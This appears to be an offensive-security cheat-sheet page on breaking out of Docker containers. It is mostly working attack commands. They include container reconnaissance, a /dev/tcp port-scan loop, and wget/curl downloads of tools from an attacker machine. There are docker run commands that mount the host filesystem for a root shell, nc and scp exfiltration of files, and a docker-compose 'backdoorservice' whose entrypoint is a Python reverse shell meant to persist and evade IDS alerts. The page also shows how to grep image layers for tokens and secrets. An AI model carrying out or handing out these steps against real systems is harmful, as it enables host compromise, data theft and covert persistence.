---
title: Docker Escape
description: Docker escape refers to a security vulnerability that could potentially allow an attacker to break out of a Docker container and gain access to the host system or other containers running on the same host.
tags:
    - Container
    - Privilege Escalation
refs:
    - https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation
    - https://gist.github.com/PwnPeter/3f0a678bf44902eae07486c9cc589c25
date: 2023-11-03
draft: false
---

## Investigation

If we are in the docker container, we first need to investigate basic information about the container.

```bash
# Environment variables
env

# Command path
echo $PATH
ls -al /usr/local/bin
ls -al /usr/local/sbin
ls -al /usr/bin
ls -al /bin

# Bash history
cat /root/.bash_history
cat /home/<username>/.bash_history

# Interesting Directories
ls -al /etc
ls -al /mnt
ls -al /opt
ls -al /srv
ls -al /var/www
ls -al /tmp
ls -al /dev/shm

# Cron
cat /etc/cron*
crontab -l

# Process
ps aux
ps aux | cat
# https://github.com/DominicBreuker/pspy
./pspy64

# Network
ip addr
netstat -punta
ss -ltu
cat /etc/hosts

# Port scan another host
nmap 172.17.0.1
for i in {1..65535}; do (echo > /dev/tcp/172.17.0.1/$i) >/dev/null 2>&1 && echo $i is open; done

# SSH
ssh <user>@<another_host>

# Check if docker command is available.
# If not, find the command in the container.
docker -h
find / -name "docker" 2>/dev/null

# Container capabilities
capsh --print
```

### Access Another Host

If we found another host but cannot access it by restrictions, we need to port forward.  
Please see [details](/exploit/network/port-forwarding/port-forwarding-with-chisel) for port fowarding.

### Import Required Binary from Local Machine

The container generally has few command that we want to use to exploit, so we need to import manually the command binaries if we need.  
Below are examples to transfer arbitrary binary into the docker container.

```bash
wget http://<local-ip>:8000/socat

curl <local-ip>:8000/scp -o socat
```

<br />

## Privilege Escalation to Root

Please see [Linux Privilege Escalation](/exploit/linux/privilege-escalation/).

<br />

## Run Vulnerable Docker Image

According to [Hacktricks](https://book.hacktricks.xyz/network-services-pentesting/2375-pentesting-docker#compromising), we can escape a docker container with the vulnerable image.  
Execute the following command in the target machine where a docker container is running..

```sh
docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
cd /mnt/
```

<br />

## Download Interesting Files

```bash
# In local machine
nc -lp 4444 > example.txt

# In remote machine
nc <local-ip> 4444 < example.txt
```

Also we can use “scp” under the condition that the local machine opens SSH server.

```bash
# In local machine
sudo systemctl start ssh

# In remote machine
scp ./example.txt <username>@<local-ip>:/home/<username>/example.txt
```

<br />

## Run Existing Docker Image

### 1. Check if current user belongs to "docker" group

```sh
groups
```

### 2. List Docker Images

```sh
docker images
```

### 3. Start Container and Get Shell

If we found Docker images running, we can use it to get a root shell
Replace **“example”** with the docker image you found.

```sh
# -v: Mount the host directory ('/') to the '/mnt' directory in the container.
# --rm: Automatically remove the container when it exits.
# -it: Interective and TTY
# chroot /mnt sh: Change the root directory of the current process to the '/mnt' directory, then execute 'sh' command to get a shell as root.
docker run -v /:/mnt --rm -it example chroot /mnt sh
```

Alternatively we can use following commands.

```sh
# --entrypoint=/bin/bash: Override the default entrypoint to '/bin/bash', which means that when the container starts, it will launch a bash shell.
docker run -it --entrypoint=/bin/bash -v /:/mnt/ <image>:<tag>
# e.g.
docker run -it --entrypoint=/bin/bash -v /:/mnt/ example:master
```

After that, you can investigate sensitive information in the **`/mnt/`** folders.

<br />

## Docker Socket Escape

Reference: [https://gist.github.com/PwnPeter/3f0a678bf44902eae07486c9cc589c25](https://gist.github.com/PwnPeter/3f0a678bf44902eae07486c9cc589c25)

<br />

## Establish Persistence After PrivEsc

After that you invaded the docker container, you might be able to make it persistence while evading the IDS alerts by creating a docker compose file and abusing the entrypoint option to grant you a reverse shell.

Create a ~/docker-compose.yaml in the container.

You need to replace the `<image>`, `<local-ip>`, `<local-ip>` with your environment.

```yml
version: "2.1"
services:
  backdoorservice:
    restart: always
    image: <image>
    entrypoint: > 
       python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
       s.connect(("<local-ip>",<local-ip>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
       pty.spawn("/bin/sh")'
    volumes:
      - /:/mnt
    privileged: true
```

Then start listener in your local machine.

```sh
nc -lvnp 4444
```

Now run the docker compose in remote machine. You should gain a shell.

```sh
docker-compose run
```

<br />

## Amazon Elastic Container Registry (ECR) Public Gallery

### 1. Run the Docker Container

- **Retrieve a Container Image**

    ```sh
    docker pull public.ecr.aws/<registry-alias>/<repository>:latest
    ```

- **Check if It was Pulled**

    ```sh
    docker images
    ```

- **Run the Container and Interect with It**

    ```sh
    docker run -it public.ecr.aws/<registry-alias>/<repository>:latest
    ```

### 2. Get Sensitive Information in the Container

You may be able to get the interesting data like **api_key**.

```sh
printenv
```

### 3. Get Sensitive Information in Local Machine

- **Check the Container Config and Retrieve Sensitive Information**

    Process the following flows in your local machine.

    ```sh
    mkdir example
    cd example/
    docker save -o example.tar public.ecr.aws/<registry-alias>/<repository>:latest
    tar -xf example.tar

    # Config files
    cat manifest.json | jq
    cat f9ab.......json | jq

    # Also config file in each directory
    cd 2246f........../
    tar -xvf layer.tar

    # Get sensitive information
    grep -e 'token' -e 'secret' */*
    ```

<br />

